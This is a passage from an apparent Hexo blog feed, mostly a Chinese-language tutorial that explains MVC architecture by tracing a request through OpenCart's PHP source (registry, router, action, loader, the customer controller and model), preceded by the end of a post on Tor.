链路的长度是普通链路的2倍，一定程度上降低了传输效率，这就是使用Tor浏览器的时候会普遍比较卡顿的原因。 参考链接http://www.ruanyifeng.com/blog/2014/02/ssl_tls.htmlhttps://gitweb.torproject.org/torspec.git/tree/PDF: tor-design.pdfhttps://www.torproject.org/projects/torbrowser/design/https://www.freehaven.net/anonbib/topic.html#Anonymous_20communication]]></content>
      <categories>
        <category>协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
        <tag>匿名通信</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于opencert的MVC架构理解]]></title>
    <url>%2F2018%2F12%2F06%2F%E5%9F%BA%E4%BA%8Eopencert%E7%9A%84MVC%E6%9E%B6%E6%9E%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[在学习了一些比较基础的web开发知识和经理一些实践之后，逐渐发觉web框架的重要性，好的框架是可以带来很大的便利的，也能够使得自己的应用变得更加的健壮。同时学习框架也使得自己在大局掌控上跟进一个台阶，同时也可以更贴近web服务的开发现状，不论是对以后的开发或者是安全审计都可以有很大的促进。在框架领域，MVC的概念是不得不深入学习的，它不只是一种技术架构，更是一种编程思想，开发思想。本文将从opencart的实例出发去学习MVC的架构思想，现总结如下： MVC三层架构含义MVC框架的作用在于分层解耦，让层与层之间的联系变得不那么紧密，同时可以很大程度的提高并行开发效率，以及更高的代码重用和方便的代码维护。 Model：模型用于表示底层数据模型结构，可能会被不同的应用程序共享，一个模型应该遵循以下的原则：（1）包含属性用于描述特定的数据（2）应该包含业务逻辑，以确保数据能够满足表现的需要（3）应该包含数据操作的逻辑，如数据的增删改等（4）不应使用$_GET $POST这样的数据，是基于model的功能和重用的考虑（5）不应出现Html代码，不属于model层的范畴 View：View层（视图）主要用于前端的表现：（1）包含Html，以及所有负责表现的代码，可以出现php，但只是用于遍历数据（2）不应该包含Db请求，数据库的操作（3）不应该出现引用$_GET $_POST这类数组的代码，View只专注于表现（4）如果必要，可以访问Model和Controller的属性，不过仅为了满足表现的需要 Controller：控制器直接负责用户的请求，对Model的调用即对View表现的控制：（1）可以访问$_GET $_POST 这样的用户请求数组（2）创建模型，并决定一个模型对象的生命周期（3）不应该出现SQL语句，数据库请求应该放到Model中（4）不应该出现Html代码，应该将其放入View中 模板引擎模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档python与php常用模板引擎举例：12345//phpSmarty,Twig,Haml,Liquid,Mustache,Plates//pythonJinja2,Mako,pyTenjin,PyJade,cheetah,django...... web框架web服务器封装的是socket，web框架封装的是response和request。web服务器（web server）的主要作用是，接收客户端请求，而web框架（webframework）则是处理web服务器收到的请求，并生成HTML内容，将生成的内容传递给web服务器，再由web服务器返回给客户端。所以，web框架是面像开发的，而web服务器是面向连接的。现如今，类似于php，java, python这样的语言都有很多集成的框架来加速开发和使得代码更方便维护等。而在现在比较出名的框架，诸如struts,spring,django,thinkphp等都是采用MVC的设计理念，使得代码更健壮。 opencert为例深入理解MVC开发模式OpenCart 是世界著名的开源电子商务系统，系统开发语言为 PHP。早期由英国人 Daniel Kerr 个人开发，目前项目托管在 GitHub。该项目采用 MVCL 架构、代码清晰规范、安装方便，使得开发者可以轻易上手进行定制开发。详情参看百度百科 简化的目录结构（只专注于学习MVC需要了解到的目录结构）123456789101112131415161718192021222324---upload/#核心代码文件夹||------index.php #web应用入口，检测安装以及安装完成的MVC入口指向startup.php------image/ #存放构建网站所需要的图片------install/ #安装目录，采用MVC的布局------admin/ #管理后台目录，采用MVC布局------catalog/ #网站应用业务目录，采用MVC布局------system/ #MVC的架构底层实现 | | ----engine/#MVC的底层引擎实现 | | | | | -----------action.php #属于router.php的子类，主要用来进行url与内部controller的路由 | -----------controller.php #controller的超类 | -----------loader.php #对象装载类 | -----------model.php #model超类 | -----------router.php #略 | ...... ----startup.php #MVC文件入口 ----framework.php #框架注册或者说是register变量的封装 ...... 一次完整的请求过程下面的例子中，将会对admin管理后台下的customer管理业务进行分析。那么业务最直接的MVC架构文件是是admin下/controller/customer/,/view/customer/,以及/model/customer。我们可以看到在实际的管理界面访问这个网站的界面如图所示: 注意到这个网站的URLhttp://localhost/OpenCart/upload/admin/index.php?route=customer/customer&amp;user_token=S9dNbDGlubJVFpjFllGyYfgg9BCdoCCr 根据网站的目录显示我们先跟进到/upload/admin/index.php这是管理后台的首页，其实在upload/文件下有也有一个index.php是默认对外提供服务的首页，其内容和现在我们看到的基本一样，只不过在用户标识上有细微的差别。 在这个index界面是对配置文件的加载和安装的检查，然后includeupload/system/startup.php,我们看下startup.php的具体内容。12345678910111213141516&lt;?php// Error Reportingerror_reporting(E_ALL);// Check Version...// Windows IIS Compatibility...// Check if SSL...// Modification Override...// Helper...function start($application_config) &#123; require_once(DIR_SYSTEM . 'framework.php'); &#125; 可以在源文件里面看到，startup.php首先是对php版本检查，时区检查，平台检查，是否开启ssl，一些引擎，插件等的装载（直观的说是include）,然后就是includeupload/system/framework.php。这个文件其实是注册了一个registry对象，这个对象是后面传递给controller，modle的第一个参数，里面封装了一些底层框架必须的类操作，而这些类都是继承来自engine/下定义的类，或其他通过startup.php include文件定义的类。所以说这个源文件相对重要，现在把framework.php全部代码展现如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170&lt;?php// Registry$registry = new Registry();// Config$config = new Config();// Load the default config$config-&gt;load('default');$config-&gt;load($application_config);$registry-&gt;set('config', $config);// Log$log = new Log($config-&gt;get('error_filename'));$registry-&gt;set('log', $log);date_default_timezone_set($config-&gt;get('date_timezone'));set_error_handler(function($code, $message, $file, $line) use($log, $config) &#123; // error suppressed with @ if (error_reporting() === 0) &#123; return false; &#125; switch ($code) &#123; case E_NOTICE: case E_USER_NOTICE: $error = 'Notice'; break; case E_WARNING: case E_USER_WARNING: $error = 'Warning'; break; case E_ERROR: case E_USER_ERROR: $error = 'Fatal Error'; break; default: $error = 'Unknown'; break; &#125; if ($config-&gt;get('error_display')) &#123; echo '&lt;b&gt;' . $error . '&lt;/b&gt;: ' . $message . ' in &lt;b&gt;' . $file . '&lt;/b&gt; on line &lt;b&gt;' . $line . '&lt;/b&gt;'; &#125; if ($config-&gt;get('error_log')) &#123; $log-&gt;write('PHP ' . $error . ': ' . $message . ' in ' . $file . ' on line ' . $line); &#125; return true;&#125;);// Event$event = new Event($registry);$registry-&gt;set('event', $event);// Event Registerif ($config-&gt;has('action_event')) &#123; foreach ($config-&gt;get('action_event') as $key =&gt; $value) &#123; foreach ($value as $priority =&gt; $action) &#123; $event-&gt;register($key, new Action($action), $priority); &#125; &#125;&#125;// Loader$loader = new Loader($registry);$registry-&gt;set('load', $loader);// Request$registry-&gt;set('request', new Request());// Response$response = new Response();$response-&gt;addHeader('Content-Type: text/html; charset=utf-8');$response-&gt;setCompression($config-&gt;get('config_compression'));$registry-&gt;set('response', $response);// Databaseif ($config-&gt;get('db_autostart')) &#123; $registry-&gt;set('db', new DB($config-&gt;get('db_engine'), $config-&gt;get('db_hostname'), $config-&gt;get('db_username'), $config-&gt;get('db_password'), $config-&gt;get('db_database'), $config-&gt;get('db_port')));&#125;// Session$session = new Session($config-&gt;get('session_engine'), $registry);$registry-&gt;set('session', $session);if ($config-&gt;get('session_autostart')) &#123; /* We are adding the session cookie outside of the session class as I believe PHP messed up in a big way handling sessions. Why in the hell is it so hard to have more than one concurrent session using cookies! Is it not better to have multiple cookies when accessing parts of the system that requires different cookie sessions for security reasons. Also cookies can be accessed via the URL parameters. So why force only one cookie for all sessions! */ if (isset($_COOKIE[$config-&gt;get('session_name')])) &#123; $session_id = $_COOKIE[$config-&gt;get('session_name')]; &#125; else &#123; $session_id = ''; &#125; $session-&gt;start($session_id); setcookie($config-&gt;get('session_name'), $session-&gt;getId(), (ini_get('session.cookie_lifetime') ? (time() + ini_get('session.cookie_lifetime')) : 0), ini_get('session.cookie_path'), ini_get('session.cookie_domain'));&#125;// Cache$registry-&gt;set('cache', new Cache($config-&gt;get('cache_engine'), $config-&gt;get('cache_expire')));// Urlif ($config-&gt;get('url_autostart')) &#123; $registry-&gt;set('url', new Url($config-&gt;get('site_url')));&#125;// Language$language = new Language($config-&gt;get('language_directory'));$registry-&gt;set('language', $language);// Document$registry-&gt;set('document', new Document());// Config Autoloadif ($config-&gt;has('config_autoload')) &#123; foreach ($config-&gt;get('config_autoload') as $value) &#123; $loader-&gt;config($value); &#125;&#125;// Language Autoloadif ($config-&gt;has('language_autoload')) &#123; foreach ($config-&gt;get('language_autoload') as $value) &#123; $loader-&gt;language($value); &#125;&#125;// Library Autoloadif ($config-&gt;has('library_autoload')) &#123; foreach ($config-&gt;get('library_autoload') as $value) &#123; $loader-&gt;library($value); &#125;&#125;// Model Autoloadif ($config-&gt;has('model_autoload')) &#123; foreach ($config-&gt;get('model_autoload') as $value) &#123; $loader-&gt;model($value); &#125;&#125;// Route$route = new Router($registry);// Pre Actionsif ($config-&gt;has('action_pre_action')) &#123; foreach ($config-&gt;get('action_pre_action') as $value) &#123; $route-&gt;addPreAction(new Action($value)); &#125;&#125;// Dispatch$route-&gt;dispatch(new Action($config-&gt;get('action_router')), new Action($config-&gt;get('action_error')));// Output$response-&gt;output(); 前面说到这个文件主要实例化了一个register类，而这个类以继承的方式实现了一些底层MVC的架构（这些会慢慢的在后面的分析中得以诠释），Register类封装的是一个在View和Controller中进行数据交换的接口$data(在下面来源于/engine/registry.php代码中，可以在Registery类的定义中看到Registry类实际上是围绕$data变量来进行一些赋值和取值操作)，也可以把Register看成一种数据结构，它在类之间传递数据。在$data这个字典类型中的key表示的是一些变量名称，但是为了方便理解，我们更愿意称之为对象名,因为这些变量存储的数据类型很杂，包括一些底层MVC的超类，如Loader,Config,Event,Language,Route等等，特别是Loader与Route类，Loader类实现了对Model，Language，View，Controller等的实例化，而Route则提供了URL的参数路由规则（这些也会在后面有所涉及）。 12345678910111213141516final class Registry &#123; private $data = array(); public function get($key) &#123; return (isset($this-&gt;data[$key]) ? $this-&gt;data[$key] : null); &#125; public function set($key, $value) &#123; $this-&gt;data[$key] = $value; &#125; public function has($key) &#123; return isset($this-&gt;data[$key]); &#125;&#125; 很好，那么到了这里，我们可以回头看下我们如果访问http://localhost/OpenCart/upload/admin/index.php?route=customer/customer&amp;user_token=S9dNbDGlubJVFpjFllGyYfgg9BCdoCCr中index.php中的相关后台运行原理已经解释得差不多了，那么route参数后的一堆东西，后台是如何处理的呢？这里就需要知道web框架MVC思想中的Route规则。首先来谈下为何需要这个路由，因为MVC中的C是十分重要的，负责处理用户请求，载入Model获取数据，然后通过$data接口交付给View,然后由渲染引擎，在这里是twig进行网页的渲染。而在众多的业务逻辑里面（我们可以在admin/controller目录中看到很多的controller），怎么通过URL来实现对不同业务的特定controller的处理一一对应？这时route规则应运而生。所以现在我们就来看下与route规则紧密相关的两个引擎源文件，system/engine/router.php和system/engine/action.php。首先来看下router.php:1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpfinal class Router &#123; private $registry; private $pre_action = array(); private $error; public function __construct($registry) &#123; $this-&gt;registry = $registry; &#125; public function addPreAction(Action $pre_action) &#123; $this-&gt;pre_action[] = $pre_action; &#125; public function dispatch(Action $action, Action $error) &#123; $this-&gt;error = $error; foreach ($this-&gt;pre_action as $pre_action) &#123; $result = $this-&gt;execute($pre_action); if ($result instanceof Action) &#123; $action = $result; break; &#125; &#125; while ($action instanceof Action) &#123; $action = $this-&gt;execute($action); &#125; &#125; private function execute(Action $action) &#123; $result = $action-&gt;execute($this-&gt;registry); if ($result instanceof Action) &#123; return $result; &#125; if ($result instanceof Exception) &#123; $action = $this-&gt;error; $this-&gt;error = null; return $action; &#125; &#125;&#125; 这个文件其实把很多的实现细节放在了action.php,所以我们重点来看action.php,以上的代码作为参考阅读。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpclass Action &#123; private $id; private $route; private $method = 'index'; public function __construct($route) &#123; $this-&gt;id = $route; $parts = explode('/', preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route)); // Break apart the route while ($parts) &#123; $file = DIR_APPLICATION . 'controller/' . implode('/', $parts) . '.php'; if (is_file($file)) &#123; $this-&gt;route = implode('/', $parts); break; &#125; else &#123; $this-&gt;method = array_pop($parts); &#125; &#125; &#125; public function getId() &#123; return $this-&gt;id; &#125; public function execute($registry, array $args = array()) &#123; // Stop any magical methods being called if (substr($this-&gt;method, 0, 2) == '__') &#123; return new \Exception('Error: Calls to magic methods are not allowed!'); &#125; $file = DIR_APPLICATION . 'controller/' . $this-&gt;route . '.php'; $class = 'Controller' . preg_replace('/[^a-zA-Z0-9]/', '', $this-&gt;route); // Initialize the class if (is_file($file)) &#123; include_once($file); $controller = new $class($registry); &#125; else &#123; return new \Exception('Error: Could not call ' . $this-&gt;route . '/' . $this-&gt;method . '!'); &#125; $reflection = new ReflectionClass($class); if ($reflection-&gt;hasMethod($this-&gt;method) &amp;&amp; $reflection-&gt;getMethod($this-&gt;method)-&gt;getNumberOfRequiredParameters() &lt;= count($args)) &#123; return call_user_func_array(array($controller, $this-&gt;method), $args); &#125; else &#123; return new \Exception('Error: Could not call ' . $this-&gt;route . '/' . $this-&gt;method . '!'); &#125; &#125;&#125; 其实不必要把整个架构的细节都给看完，因为其中涉及了比较多的校验和错误捕捉和处理。所以以上代码实际处理业务的部分就是router后参数的拆分，然后进行一些校验，合格的话就去include一个controller类然后实例化它，最后以拆分好的形式传入call_user_func_array。其实拆分的原则就是通过router参数以/进行拆分，然后字符串连接，到admin的相应文件夹下去获取相应类的文件路径。在这里?route=customer/customer其实就是调用customer/customer.php文件里定义的类，然后通过$controller = new $class($registry);实例化它。然后就是条用call_func_array来执行controller类里面的method，传入的参数为$args，这里有个点就是在默认的情况下，调用的方法为index。接下来我们就要进入admin/contorller/customer/customer.php一探究竟，弄个清楚到底这个controller处理了哪些业务逻辑以及如何和Model，View进行交互。 123456789101112131415&lt;?phpclass ControllerCustomerCustomer extends Controller &#123; private $error = array(); public function index() &#123; $this-&gt;load-&gt;language(&apos;customer/customer&apos;); $this-&gt;document-&gt;setTitle($this-&gt;language-&gt;get(&apos;heading_title&apos;)); $this-&gt;load-&gt;model(&apos;customer/customer&apos;); $this-&gt;getList(); &#125;...... 这个文件内容比较多，不太适合全部copy到这里来进行分析，但是通过ControllerCustomerCustomer类的一些方法举例来阐述MVC的概念就可以起到不错的分析效果。当然在深入解析这个过程的时候，我们首先需要理解一下$this-&gt;load方法的实现原理。了解过面像对象编程的兄弟可能一时无法理解基类没有load方法，而本类也没有实现该方法，那么这个方法是如何得以调用实现的呢？先不急，我们先来看个比较神奇的php魔术方法举例：1234567891011121314&lt;?phpclass test&#123; public $a='h'; public function test()&#123; $c='hello'; &#125; function __get($key)&#123; echo $key; &#125; &#125;&#125;$b=new test();$b-&gt;load;?&gt; 试想一下，运行这段代码，我们会得到什么结果？答案是:load。是的，在调用一个不存在的或者没有访问权限的对象的时候，类会主动调用get().方法，而load就会作为参数传入get()函数。那么举这个例子和我们理解上面代码有什么关系呢？我们可以看到Controller基类的代码实现如下：123456789101112131415abstract class Controller &#123; protected $registry; public function __construct($registry) &#123; $this-&gt;registry = $registry; &#125; public function __get($key) &#123; return $this-&gt;registry-&gt;get($key); &#125; public function __set($key, $value) &#123; $this-&gt;registry-&gt;set($key, $value); &#125;&#125; 是的同样实现了__get()方法，这样我们就会调用它，最后他会返回一个registry-&gt;get(“load”)传回的对象，参考上面的Register类的定义以及framework.php的注册变量过程，我们可以发现，这里其实返回的是一个Loader对象，而Loader对象的定义如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495final class Loader &#123; protected $registry; /** * Constructor * * @param object $registry */ public function __construct($registry) &#123; $this-&gt;registry = $registry; &#125; public function controller($route) &#123; $args = func_get_args(); array_shift($args); // Sanitize the call $route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route); // Keep the original trigger $trigger = $route; // Trigger the pre events $result = $this-&gt;registry-&gt;get('event')-&gt;trigger('controller/' . $trigger . '/before', array(&amp;$route, &amp;$args)); // Make sure its only the last event that returns an output if required. if ($result != null &amp;&amp; !$result instanceof Exception) &#123; $output = $result; &#125; else &#123; $action = new Action($route); $output = $action-&gt;execute($this-&gt;registry, $args); &#125; // Trigger the post events $result = $this-&gt;registry-&gt;get('event')-&gt;trigger('controller/' . $trigger . '/after', array(&amp;$route, &amp;$args, &amp;$output)); if ($result &amp;&amp; !$result instanceof Exception) &#123; $output = $result; &#125; if (!$output instanceof Exception) &#123; return $output; &#125; &#125; public function model($route) &#123; // Sanitize the call $route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route); if (!$this-&gt;registry-&gt;has('model_' . str_replace('/', '_', $route))) &#123; $file = DIR_APPLICATION . 'model/' . $route . '.php'; $class = 'Model' . preg_replace('/[^a-zA-Z0-9]/', '', $route); if (is_file($file)) &#123; include_once($file); $proxy = new Proxy(); // Overriding models is a little harder so we have to use PHP's magic methods // In future version we can use runkit foreach (get_class_methods($class) as $method) &#123; $proxy-&gt;&#123;$method&#125; = $this-&gt;callback($route . '/' . $method); &#125; $this-&gt;registry-&gt;set('model_' . str_replace('/', '_', (string)$route), $proxy); &#125; else &#123; throw new \Exception('Error: Could not load model ' . $route . '!'); &#125; &#125; &#125; public function view($route, $data = array()) &#123; // Sanitize the call $route = preg_replace('/[^a-zA-Z0-9_\/]/', '', (string)$route); // Keep the original trigger $trigger = $route; $template = new Template($this-&gt;registry-&gt;get('config')-&gt;get('template_engine')); // Trigger the pre events $result = $this-&gt;registry-&gt;get('event')-&gt;trigger('view/' . $trigger . '/before', array(&amp;$route, &amp;$data, &amp;$template)); // Make sure its only the last event that returns an output if required. if ($result &amp;&amp; !$result instanceof Exception) &#123; $output = $result; &#125; else &#123; foreach ($data as $key =&gt; $value) &#123; $template-&gt;set($key, $value); &#125; $output = $template-&gt;render($this-&gt;registry-&gt;get('config')-&gt;get('template_directory') . $route, $this-&gt;registry-&gt;get('config')-&gt;get('template_cache')); &#125;...... 所以到这里就可以大致了解load方法调用的本质。所以说Loader是和Router类是在MVC架构中十分重要的两个组件。理解到这里，我们就来继续看下ControllerCustomerCustomer类的具体实现，了解它和view,modle的交互。通过下图可以看到整个ControllerCustomerCustomer 的代码量比较大，为了理解MVC没有必要把每一个方法的实现都理解透彻，我们可以举几个比较典型的方法的实现来阐述MVC的实现过程。 为了演示，在前端界面我们点击edit图标，可以看到对应的url参数有了变化,变成了localhost/OpenCart/upload/admin/index.php?route=customer/customer/edit&amp;user_token=QcODkXWS5tEYdqb03TXRXdqgzsoaGAMp&amp;customer_id=1,同样的界面变化如下： 根据我们之前的了解，这里是调用了ControllerCustomerCustomer类的edit方法，而edit方法的实现代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public function edit() &#123; $this-&gt;load-&gt;language('customer/customer'); $this-&gt;document-&gt;setTitle($this-&gt;language-&gt;get('heading_title')); $this-&gt;load-&gt;model('customer/customer'); if (($this-&gt;request-&gt;server['REQUEST_METHOD'] == 'POST') &amp;&amp; $this-&gt;validateForm()) &#123; $this-&gt;model_customer_customer-&gt;editCustomer($this-&gt;request-&gt;get['customer_id'], $this-&gt;request-&gt;post); $this-&gt;session-&gt;data['success'] = $this-&gt;language-&gt;get('text_success'); $url = ''; if (isset($this-&gt;request-&gt;get['filter_name'])) &#123; $url .= '&amp;filter_name=' . urlencode(html_entity_decode($this-&gt;request-&gt;get['filter_name'], ENT_QUOTES, 'UTF-8')); &#125; if (isset($this-&gt;request-&gt;get['filter_email'])) &#123; $url .= '&amp;filter_email=' . urlencode(html_entity_decode($this-&gt;request-&gt;get['filter_email'], ENT_QUOTES, 'UTF-8')); &#125; if (isset($this-&gt;request-&gt;get['filter_customer_group_id'])) &#123; $url .= '&amp;filter_customer_group_id=' . $this-&gt;request-&gt;get['filter_customer_group_id']; &#125; if (isset($this-&gt;request-&gt;get['filter_status'])) &#123; $url .= '&amp;filter_status=' . $this-&gt;request-&gt;get['filter_status']; &#125; if (isset($this-&gt;request-&gt;get['filter_ip'])) &#123; $url .= '&amp;filter_ip=' . $this-&gt;request-&gt;get['filter_ip']; &#125; if (isset($this-&gt;request-&gt;get['filter_date_added'])) &#123; $url .= '&amp;filter_date_added=' . $this-&gt;request-&gt;get['filter_date_added']; &#125; if (isset($this-&gt;request-&gt;get['sort'])) &#123; $url .= '&amp;sort=' . $this-&gt;request-&gt;get['sort']; &#125; if (isset($this-&gt;request-&gt;get['order'])) &#123; $url .= '&amp;order=' . $this-&gt;request-&gt;get['order']; &#125; if (isset($this-&gt;request-&gt;get['page'])) &#123; $url .= '&amp;page=' . $this-&gt;request-&gt;get['page']; &#125; $this-&gt;response-&gt;redirect($this-&gt;url-&gt;link('customer/customer', 'user_token=' . $this-&gt;session-&gt;data['user_token'] . $url)); &#125; $this-&gt;getForm(); &#125; 可以看到在这个函数中加载了model_customer_customer这个Model接口来进行相关的数据查询（至于为啥是这样一个方法，这是一个开发时候的规定，通过特定的方法来实现Model中ModelCustomerCustomer映射成为controller里面的类model_customer_customer），然后其他的一些逻辑是通过获取post,get获取的参数做一些逻辑判断（这一部分的代码实现在system/library里面，有兴趣的可以自己去看下，post,get,session等的底层封装实现），最后调用了getFrom的方法来实现与View的连接。另外需要注意的是，在opencart中除了MVC外还有个L部分，就是language。所谓的language就是一些需要在不同业务逻辑中显示在客户端的语句，这里也单独进行了分离编写，通过$this-&gt;load-&gt;language(‘customer/customer’)调用。在这里admin/language/customer/customer/customer.php language的内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?php// Heading$_[&apos;heading_title&apos;] = &apos;Customers&apos;;// Text$_[&apos;text_success&apos;] = &apos;Success: You have modified customers!&apos;;$_[&apos;text_list&apos;] = &apos;Customer List&apos;;$_[&apos;text_add&apos;] = &apos;Add Customer&apos;;$_[&apos;text_edit&apos;] = &apos;Edit Customer&apos;;$_[&apos;text_default&apos;] = &apos;Default&apos;;$_[&apos;text_account&apos;] = &apos;Customer Details&apos;;$_[&apos;text_password&apos;] = &apos;Password&apos;;$_[&apos;text_other&apos;] = &apos;Other&apos;;$_[&apos;text_balance&apos;] = &apos;Balance&apos;;$_[&apos;text_address&apos;] = &apos;Address&apos;;$_[&apos;text_history&apos;] = &apos;History&apos;;$_[&apos;text_history_add&apos;] = &apos;Add History&apos;;$_[&apos;text_transaction&apos;] = &apos;Transactions&apos;;$_[&apos;text_transaction_add&apos;] = &apos;Add Transaction&apos;;$_[&apos;text_reward&apos;] = &apos;Reward Points&apos;;$_[&apos;text_reward_add&apos;] = &apos;Add Reward Points&apos;;$_[&apos;text_ip&apos;] = &apos;IP&apos;;$_[&apos;text_option&apos;] = &apos;Options&apos;;$_[&apos;text_login&apos;] = &apos;Login into Store&apos;;$_[&apos;text_unlock&apos;] = &apos;Unlock Account&apos;;// Column$_[&apos;column_name&apos;] = &apos;Customer Name&apos;;$_[&apos;column_email&apos;] = &apos;E-Mail&apos;;$_[&apos;column_customer_group&apos;] = &apos;Customer Group&apos;;$_[&apos;column_status&apos;] = &apos;Status&apos;;$_[&apos;column_date_added&apos;] = &apos;Date Added&apos;;$_[&apos;column_comment&apos;] = &apos;Comment&apos;;$_[&apos;column_description&apos;] = &apos;Description&apos;;$_[&apos;column_amount&apos;] = &apos;Amount&apos;;$_[&apos;column_points&apos;] = &apos;Points&apos;;$_[&apos;column_ip&apos;] = &apos;IP&apos;;$_[&apos;column_account&apos;] = &apos;Accounts&apos;;$_[&apos;column_store&apos;] = &apos;Store&apos;;$_[&apos;column_country&apos;] = &apos;Country&apos;;$_[&apos;column_action&apos;] = &apos;Action&apos;;// Entry$_[&apos;entry_customer_group&apos;] = &apos;Customer Group&apos;;$_[&apos;entry_firstname&apos;] = &apos;First Name&apos;;$_[&apos;entry_lastname&apos;] = &apos;Last Name&apos;;$_[&apos;entry_email&apos;] = &apos;E-Mail&apos;;$_[&apos;entry_telephone&apos;] = &apos;Telephone&apos;;$_[&apos;entry_newsletter&apos;] = &apos;Newsletter&apos;;$_[&apos;entry_status&apos;] = &apos;Status&apos;;$_[&apos;entry_safe&apos;] = &apos;Safe&apos;;$_[&apos;entry_password&apos;] = &apos;Password&apos;;$_[&apos;entry_confirm&apos;] = &apos;Confirm&apos;;$_[&apos;entry_company&apos;] = &apos;Company&apos;;$_[&apos;entry_address_1&apos;] = &apos;Address 1&apos;;$_[&apos;entry_address_2&apos;] = &apos;Address 2&apos;;$_[&apos;entry_city&apos;] = &apos;City&apos;;$_[&apos;entry_postcode&apos;] = &apos;Postcode&apos;;$_[&apos;entry_country&apos;] = &apos;Country&apos;;$_[&apos;entry_zone&apos;] = &apos;Region / State&apos;;$_[&apos;entry_default&apos;] = &apos;Default Address&apos;;$_[&apos;entry_comment&apos;] = &apos;Comment&apos;;$_[&apos;entry_description&apos;] = &apos;Description&apos;;$_[&apos;entry_amount&apos;] = &apos;Amount&apos;;$_[&apos;entry_points&apos;] = &apos;Points&apos;;$_[&apos;entry_name&apos;] = &apos;Customer Name&apos;;$_[&apos;entry_ip&apos;] = &apos;IP&apos;;$_[&apos;entry_date_added&apos;] = &apos;Date Added&apos;;// Help$_[&apos;help_safe&apos;] = &apos;Set to true to avoid this customer from being caught by the anti-fraud system&apos;;$_[&apos;help_points&apos;] = &apos;Use minus to remove points&apos;;// Error$_[&apos;error_warning&apos;] = &apos;Warning: Please check the form carefully for errors!&apos;;$_[&apos;error_permission&apos;] = &apos;Warning: You do not have permission to modify customers!&apos;;$_[&apos;error_exists&apos;] = &apos;Warning: E-Mail Address is already registered!&apos;;$_[&apos;error_firstname&apos;] = &apos;First Name must be between 1 and 32 characters!&apos;;$_[&apos;error_lastname&apos;] = &apos;Last Name must be between 1 and 32 characters!&apos;;$_[&apos;error_email&apos;] = &apos;E-Mail Address does not appear to be valid!&apos;;$_[&apos;error_telephone&apos;] = &apos;Telephone must be between 3 and 32 characters!&apos;;$_[&apos;error_password&apos;] = &apos;Password must be between 4 and 20 characters!&apos;;$_[&apos;error_confirm&apos;] = &apos;Password and password confirmation do not match!&apos;;$_[&apos;error_address_1&apos;] = &apos;Address 1 must be between 3 and 128 characters!&apos;;$_[&apos;error_city&apos;] = &apos;City must be between 2 and 128 characters!&apos;;$_[&apos;error_postcode&apos;] = &apos;Postcode must be between 2 and 10 characters for this country!&apos;;$_[&apos;error_country&apos;] = &apos;Please select a country!&apos;;$_[&apos;error_zone&apos;] = &apos;Please select a region / state!&apos;;$_[&apos;error_custom_field&apos;] = &apos;%s required!&apos;; 接下来我们会进入到ModelCustomerCustomer，查看editCustomer方法： 123456789101112131415161718192021public function editCustomer($customer_id, $data) &#123; $this-&gt;db-&gt;query("UPDATE " . DB_PREFIX . "customer SET customer_group_id = '" . (int)$data['customer_group_id'] . "', firstname = '" . $this-&gt;db-&gt;escape((string)$data['firstname']) . "', lastname = '" . $this-&gt;db-&gt;escape((string)$data['lastname']) . "', email = '" . $this-&gt;db-&gt;escape((string)$data['email']) . "', telephone = '" . $this-&gt;db-&gt;escape((string)$data['telephone']) . "', custom_field = '" . $this-&gt;db-&gt;escape(isset($data['custom_field']) ? json_encode($data['custom_field']) : json_encode(array())) . "', newsletter = '" . (int)$data['newsletter'] . "', status = '" . (int)$data['status'] . "', safe = '" . (int)$data['safe'] . "' WHERE customer_id = '" . (int)$customer_id . "'"); if ($data['password']) &#123; $this-&gt;db-&gt;query("UPDATE " . DB_PREFIX . "customer SET salt = '', password = '" . $this-&gt;db-&gt;escape(password_hash($data['password'], PASSWORD_DEFAULT)) . "' WHERE customer_id = '" . (int)$customer_id . "'"); &#125; $this-&gt;db-&gt;query("DELETE FROM " . DB_PREFIX . "address WHERE customer_id = '" . (int)$customer_id . "'"); if (isset($data['address'])) &#123; foreach ($data['address'] as $key =&gt; $address) &#123; $this-&gt;db-&gt;query("INSERT INTO " . DB_PREFIX . "address SET address_id = '" . (int)$address['address_id'] . "', customer_id = '" . (int)$customer_id . "', firstname = '" . $this-&gt;db-&gt;escape($address['firstname']) . "', lastname = '" . $this-&gt;db-&gt;escape($address['lastname']) . "', company = '" . $this-&gt;db-&gt;escape($address['company']) . "', address_1 = '" . $this-&gt;db-&gt;escape($address['address_1']) . "', address_2 = '" . $this-&gt;db-&gt;escape($address['address_2']) . "', city = '" . $this-&gt;db-&gt;escape($address['city']) . "', postcode = '" . $this-&gt;db-&gt;escape($address['postcode']) . "', country_id = '" . (int)$address['country_id'] . "', zone_id = '" . (int)$address['zone_id'] . "', custom_field = '" . $this-&gt;db-&gt;escape(isset($address['custom_field']) ? json_encode($address['custom_field']) : json_encode(array())) . "'"); if (isset($data['default']) &amp;&amp; $data['default'] == $key) &#123; $address_id = $this-&gt;db-&gt;getLastId(); $this-&gt;db-&gt;query("UPDATE " . DB_PREFIX . "customer SET address_id = '" . (int)$address_id . "' WHERE customer_id = '" . (int)$customer_id . "'"); &#125; &#125; &#125; &#125; 